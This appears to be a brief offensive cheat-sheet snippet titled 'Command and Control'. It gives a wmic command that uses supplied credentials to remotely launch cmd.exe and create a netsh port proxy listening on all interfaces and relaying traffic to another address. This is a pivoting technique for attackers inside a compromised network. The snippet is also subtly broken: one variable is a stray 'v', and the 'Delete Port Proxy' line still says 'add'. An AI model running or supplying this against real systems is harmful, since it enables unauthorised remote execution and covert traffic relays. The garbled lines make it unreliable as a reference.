# Command and Control
## Creating Port Proxy
$node = ""
$userName = ""
$passwd = ""
$connPort = ""
v = ""
wmic /node:$node /user:$userName /password:$passwd process call create "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=$connPort connectaddress=$connAddress"

# Delete Port Proxy
#wmic /node:$node /user:$userName /password:$passwd process call create "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0"